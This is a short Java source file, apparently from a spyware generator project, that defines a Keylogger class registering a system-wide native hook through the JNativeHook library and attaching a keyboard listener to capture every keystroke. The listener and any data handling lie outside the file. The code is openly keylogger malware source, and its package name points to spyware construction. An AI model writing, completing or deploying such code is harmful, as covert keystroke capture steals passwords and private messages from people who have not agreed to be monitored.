package com.houarizegai.spygen.keylogger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

public class Keylogger {
    public static NativeKeyboard keyboard;

    public static void startKeylogger() {
        try {
            GlobalScreen.registerNativeHook();
        } catch(NativeHookException nhe) {
            nhe.printStackTrace();
        }
        GlobalScreen.getInstance().addNativeKeyListener(keyboard = new NativeKeyboard());
    }
}
